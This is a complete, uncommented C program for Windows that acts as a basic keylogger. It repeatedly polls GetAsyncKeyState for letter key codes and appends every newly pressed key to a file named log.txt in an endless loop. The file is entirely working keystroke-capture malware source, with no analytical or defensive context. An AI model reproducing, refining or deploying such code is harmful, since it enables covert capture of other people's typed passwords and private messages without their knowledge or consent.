#include <windows.h>
#include <stdio.h>
#include <stdbool.h>

int main()
{
    int result, keys;
    FILE *fp;

    fp = fopen("log.txt", "a");

    while (true) {
        for (keys = 64; keys <= 90; keys++) {
            Sleep(1);

            result = GetAsyncKeyState(keys);

            if (result == -32767) {
                fprintf(fp, "%c", keys);
            }
        }
    }
    return 0;
}